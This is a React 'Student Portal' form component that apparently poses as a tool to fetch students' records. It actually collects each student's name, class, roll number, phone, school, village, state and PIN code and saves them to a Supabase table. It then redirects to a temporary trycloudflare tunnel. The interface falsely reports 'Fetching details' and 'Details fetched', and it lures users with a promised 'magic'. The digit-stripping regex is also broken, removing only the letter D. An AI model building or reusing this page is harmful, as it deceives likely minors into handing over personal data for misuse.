import { useState } from "react";
import { Link } from "react-router";
import {
  AlertCircle,
  ArrowLeft,
  ArrowRight,
  CheckCircle2,
  ChevronDown,
  GraduationCap,
  Hash,
  LoaderCircle,
  MapPin,
  Phone,
  School,
  UserRound,
} from "lucide-react";
import { supabase } from "./lib/supabase";

const REDIRECT_URL = "https://purposes-losses-lanka-securities.trycloudflare.com";

const STATES = [
  "Andhra Pradesh",
  "Arunachal Pradesh",
  "Assam",
  "Bihar",
  "Chhattisgarh",
  "Goa",
  "Gujarat",
  "Haryana",
  "Himachal Pradesh",
  "Jharkhand",
  "Karnataka",
  "Kerala",
  "Madhya Pradesh",
  "Maharashtra",
  "Manipur",
  "Meghalaya",
  "Mizoram",
  "Nagaland",
  "Odisha",
  "Punjab",
  "Rajasthan",
  "Sikkim",
  "Tamil Nadu",
  "Telangana",
  "Tripura",
  "Uttar Pradesh",
  "Uttarakhand",
  "West Bengal",
  "Delhi",
  "Jammu and Kashmir",
  "Ladakh",
  "Puducherry",
];

const initialForm = {
  name: "",
  studentClass: "",
  rollNumber: "",
  phone: "",
  schoolName: "",
  village: "",
  pinCode: "",
};

function Field({
  id,
  label,
  value,
  onChange,
  placeholder,
  icon: Icon,
  error,
  disabled,
  type = "text",
  maxLength,
}) {
  return (
    <div className="space-y-2">
      <label
        htmlFor={id}
        className="block text-sm font-semibold text-slate-700"
      >
        {label}
      </label>

      <div className="relative">
        <Icon
          size={19}
          className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-slate-400"
        />

        <input
          id={id}
          name={id}
          type={type}
          value={value}
          onChange={onChange}
          placeholder={placeholder}
          disabled={disabled}
          maxLength={maxLength}
          className={`w-full rounded-xl border bg-white py-3.5 pl-11 pr-4 text-sm outline-none transition focus:ring-4 disabled:bg-slate-100 ${
            error
              ? "border-red-400 focus:border-red-500 focus:ring-red-100"
              : "border-slate-200 focus:border-indigo-500 focus:ring-indigo-100"
          }`}
        />
      </div>

      {error && (
        <p className="flex items-center gap-1.5 text-xs font-medium text-red-600">
          <AlertCircle size={14} />
          {error}
        </p>
      )}
    </div>
  );
}

export default function FetchDetails() {
  const [form, setForm] = useState(initialForm);
  const [selectedState, setSelectedState] = useState("");
  const [errors, setErrors] = useState({});
  const [status, setStatus] = useState("idle");
  const [saveError, setSaveError] = useState("");

  const isSubmitting = status === "processing";

  function handleChange(event) {
    const { name, value } = event.target;
    let nextValue = value;

    if (name === "phone") {
      nextValue = value.replace(/D/g, "").slice(0, 10);
    }

    if (name === "pinCode") {
      nextValue = value.replace(/D/g, "").slice(0, 6);
    }

    setForm((current) => ({
      ...current,
      [name]: nextValue,
    }));

    setErrors((current) => ({
      ...current,
      [name]: "",
    }));

    setSaveError("");
  }

  function handleStateChange(event) {
    setSelectedState(event.target.value);

    setErrors((current) => ({
      ...current,
      state: "",
    }));

    setSaveError("");
  }

  function validate() {
    const nextErrors = {};

    if (!form.name.trim()) {
      nextErrors.name = "Please enter your name.";
    }

    if (!form.studentClass.trim()) {
      nextErrors.studentClass = "Please enter your class.";
    }

    if (!form.rollNumber.trim()) {
      nextErrors.rollNumber = "Please enter your roll number.";
    }

    if (!/^[6-9][0-9]{9}$/.test(form.phone)) {
      nextErrors.phone = "Enter a valid 10-digit mobile number.";
    }

    if (!selectedState) {
      nextErrors.state = "Please select your state.";
    }

    if (!form.schoolName.trim()) {
      nextErrors.schoolName = "Please enter your school name.";
    }

    if (!form.village.trim()) {
      nextErrors.village = "Please enter your village.";
    }

    if (!/^[1-9][0-9]{5}$/.test(form.pinCode)) {
      nextErrors.pinCode = "Enter a valid 6-digit PIN code.";
    }

    return nextErrors;
  }

  async function handleSubmit(event) {
    event.preventDefault();

    const validationErrors = validate();

    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    if (!supabase) {
      setSaveError("Supabase is not configured.");
      return;
    }

    setStatus("processing");
    setSaveError("");
    setErrors({});

    const submission = {
      name: form.name.trim(),
      student_class: form.studentClass.trim(),
      roll_number: form.rollNumber.trim(),
      phone: form.phone,
      school_name: form.schoolName.trim(),
      village: form.village.trim(),
      pin_code: form.pinCode,
      state: selectedState,
    };

    try {
      const { error } = await supabase
        .from("student_submissions")
        .insert([submission]);

      if (error) {
        setSaveError(error.message);
        setStatus("idle");
        return;
      }

      setStatus("success");

      window.location.href = REDIRECT_URL;
    } catch (error) {
      setSaveError(error?.message || "Could not save details.");
      setStatus("idle");
    }
  }

  return (
    <main className="min-h-screen bg-slate-50 px-4 py-8 sm:px-6 lg:px-8">
      <div className="mx-auto max-w-5xl">
        <Link
          to="/"
          className="mb-6 inline-flex items-center gap-2 text-sm font-semibold text-indigo-600 hover:text-indigo-800"
        >
          <ArrowLeft size={17} />
          Back to Home
        </Link>

        <div className="grid overflow-hidden rounded-3xl bg-white shadow-2xl shadow-indigo-950/10 lg:grid-cols-[0.8fr_1.2fr]">
          <section className="hidden bg-gradient-to-br from-indigo-700 via-blue-700 to-slate-950 p-10 text-white lg:block">
            <div className="flex h-14 w-14 items-center justify-center rounded-2xl bg-white/15">
              <GraduationCap size={30} />
            </div>

            <p className="mt-10 text-sm font-bold uppercase tracking-[0.2em] text-blue-200">
              Student details
            </p>

            <h1 className="mt-4 text-4xl font-black leading-tight">
              Continue your academic journey.
            </h1>

            <p className="mt-5 leading-7 text-blue-100">
              Enter accurate information to fetch your student details.
            </p>
          </section>

          <section className="p-6 sm:p-10">
            <div className="mb-8 lg:hidden">
              <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-indigo-100 text-indigo-700">
                <GraduationCap size={26} />
              </div>
            </div>

            <p className="text-sm font-bold uppercase tracking-[0.2em] text-indigo-600">
              Student Portal
            </p>

            <h2 className="mt-3 text-3xl font-black text-slate-950">
              Fetch your details
            </h2>

            <p className="mt-3 text-sm leading-6 text-slate-500">
              Complete the form to see a magic. you won't believe.
            </p>

            <form onSubmit={handleSubmit} className="mt-8 space-y-5" noValidate>
              <div className="grid gap-5 sm:grid-cols-2">
                <Field
                  id="name"
                  label="Name"
                  value={form.name}
                  onChange={handleChange}
                  placeholder="Enter your name"
                  icon={UserRound}
                  error={errors.name}
                  disabled={isSubmitting}
                />

                <Field
                  id="studentClass"
                  label="Class"
                  value={form.studentClass}
                  onChange={handleChange}
                  placeholder="Example: Class 10"
                  icon={School}
                  error={errors.studentClass}
                  disabled={isSubmitting}
                />

                <Field
                  id="rollNumber"
                  label="Roll Number"
                  value={form.rollNumber}
                  onChange={handleChange}
                  placeholder="Enter roll number"
                  icon={Hash}
                  error={errors.rollNumber}
                  disabled={isSubmitting}
                />

                <Field
                  id="phone"
                  label="Phone Number"
                  value={form.phone}
                  onChange={handleChange}
                  placeholder="10-digit mobile number"
                  icon={Phone}
                  error={errors.phone}
                  disabled={isSubmitting}
                  type="tel"
                  maxLength={10}
                />

                <div className="space-y-2 sm:col-span-2">
                  <label
                    htmlFor="state"
                    className="block text-sm font-semibold text-slate-700"
                  >
                    State
                  </label>

                  <div className="relative">
                    <MapPin
                      size={19}
                      className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-slate-400"
                    />

                    <select
                      id="state"
                      name="state"
                      value={selectedState}
                      onChange={handleStateChange}
                      disabled={isSubmitting}
                      className={`w-full appearance-none rounded-xl border bg-white py-3.5 pl-11 pr-11 text-sm outline-none focus:ring-4 ${
                        errors.state
                          ? "border-red-400 focus:border-red-500 focus:ring-red-100"
                          : "border-slate-200 focus:border-indigo-500 focus:ring-indigo-100"
                      }`}
                    >
                      <option value="">Select your state</option>

                      {STATES.map((state) => (
                        <option key={state} value={state}>
                          {state}
                        </option>
                      ))}
                    </select>

                    <ChevronDown
                      size={18}
                      className="pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 text-slate-400"
                    />
                  </div>

                  {errors.state && (
                    <p className="text-xs font-medium text-red-600">
                      {errors.state}
                    </p>
                  )}
                </div>

                <div className="sm:col-span-2">
                  <Field
                    id="schoolName"
                    label="School Name"
                    value={form.schoolName}
                    onChange={handleChange}
                    placeholder="Type your school name"
                    icon={School}
                    error={errors.schoolName}
                    disabled={isSubmitting}
                  />
                </div>

                <Field
                  id="village"
                  label="Village"
                  value={form.village}
                  onChange={handleChange}
                  placeholder="Enter your village"
                  icon={MapPin}
                  error={errors.village}
                  disabled={isSubmitting}
                />

                <Field
                  id="pinCode"
                  label="PIN Code"
                  value={form.pinCode}
                  onChange={handleChange}
                  placeholder="6-digit PIN code"
                  icon={MapPin}
                  error={errors.pinCode}
                  disabled={isSubmitting}
                  type="tel"
                  maxLength={6}
                />
              </div>

              {isSubmitting && (
                <div className="flex items-center gap-2 rounded-xl bg-blue-50 px-4 py-3 text-sm font-semibold text-blue-700">
                  <LoaderCircle size={18} className="animate-spin" />
                  Fetching details...
                </div>
              )}

              {status === "success" && (
                <div className="flex items-center gap-2 rounded-xl bg-emerald-50 px-4 py-3 text-sm font-semibold text-emerald-700">
                  <CheckCircle2 size={18} />
                  Details fetched. Redirecting...
                </div>
              )}

              {saveError && (
                <div className="flex items-center gap-2 rounded-xl bg-red-50 px-4 py-3 text-sm font-semibold text-red-700">
                  <AlertCircle size={18} />
                  {saveError}
                </div>
              )}

              <button
                type="submit"
                disabled={isSubmitting}
                className="flex w-full items-center justify-center gap-2 rounded-xl bg-indigo-600 px-5 py-3.5 text-sm font-bold text-white shadow-lg shadow-indigo-600/20 hover:bg-indigo-700 disabled:bg-slate-400"
              >
                {isSubmitting ? "Saving..." : "fetch Details"}
                {!isSubmitting && <ArrowRight size={18} />}
              </button>
            </form>
          </section>
        </div>
      </div>
    </main>
  );
}
